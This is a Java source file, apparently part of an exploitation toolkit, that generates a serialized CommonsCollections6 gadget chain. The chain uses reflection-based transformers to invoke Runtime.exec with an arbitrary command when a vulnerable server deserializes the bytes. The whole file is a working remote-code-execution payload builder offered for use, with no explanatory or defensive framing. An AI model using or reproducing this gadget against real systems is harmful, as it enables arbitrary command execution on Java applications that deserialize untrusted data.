package com.droplab.Utils.UnSerialize.Gadget;

import com.droplab.Utils.UnSerialize.Gadget.Interface.GadgetInterface;
import com.droplab.Utils.UnSerialize.utils.Gadgets;
import com.droplab.Utils.UnSerialize.utils.Reflections;

import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.xml.transform.Templates;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

public class BlindCommonsCollection6 implements GadgetInterface {
    @Override
    public byte[] getObject(final Object o) {
        try {
            final String[] execArgs = new String[] { (String)o };

            final Transformer[] transformers = new Transformer[] {
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod", new Class[] {
                            String.class, Class[].class }, new Object[] {
                            "getRuntime", new Class[0] }),
                    new InvokerTransformer("invoke", new Class[] {
                            Object.class, Object[].class }, new Object[] {
                            null, new Object[0] }),
                    new InvokerTransformer("exec",
                            new Class[] { String.class }, execArgs),
                    new ConstantTransformer(1) };

            Transformer transformerChain = new ChainedTransformer(transformers);
            final Map innerMap = new HashMap();

            final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);

            TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");

            HashSet map = new HashSet(1);
            map.add("foo");
            Field f = null;
            try {
                f = HashSet.class.getDeclaredField("map");
            } catch (NoSuchFieldException e) {
                f = HashSet.class.getDeclaredField("backingMap");
            }

            Reflections.setAccessible(f);
            HashMap innimpl = (HashMap) f.get(map);

            Field f2 = null;
            try {
                f2 = HashMap.class.getDeclaredField("table");
            } catch (NoSuchFieldException e) {
                f2 = HashMap.class.getDeclaredField("elementData");
            }

            Reflections.setAccessible(f2);
            Object[] array = (Object[]) f2.get(innimpl);

            Object node = array[0];
            if(node == null){
                node = array[1];
            }

            Field keyField = null;
            try{
                keyField = node.getClass().getDeclaredField("key");
            }catch(Exception e){
                keyField = Class.forName("java.util.MapEntry").getDeclaredField("key");
            }

            Reflections.setAccessible(keyField);
            keyField.set(node, entry);

            return Gadgets.SerializeObject(map);
        }catch (Exception e){
            e.printStackTrace();
        }
        return new byte[0];
    }
}
